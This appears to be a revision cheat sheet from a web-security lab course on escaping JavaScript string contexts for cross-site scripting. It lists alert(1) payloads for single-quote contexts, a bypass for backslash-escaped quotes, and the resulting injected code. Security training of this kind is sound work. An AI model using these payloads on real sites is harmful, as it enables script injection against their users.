# JavaScript String Breakout CheatSheet

## Single Quote Context

```javascript
var input = 'USER_INPUT';
```

---

### Payload

```javascript
';alert(1)//
```

---

### Result

```javascript
'';alert(1)//';
```

---

# Alternative Payload

```javascript
'-alert(1)-'
```

---

# Escaped Quote Scenario

Application:

```javascript
'
```

becomes:

```javascript
\'
```

---

### Bypass

```javascript
\';alert(1)//
```

---

### Result

```javascript
\\';alert(1)//
```

---

# Common Goals

```text
Terminate String
        ↓
Execute JavaScript
        ↓
Repair Script
```

---

# Related Labs

```text
Lab19
Lab20
```

---

# Quick Revision

```text
String Context
        ↓
Break String
        ↓
Execute JS
        ↓
Comment Remaining Code
```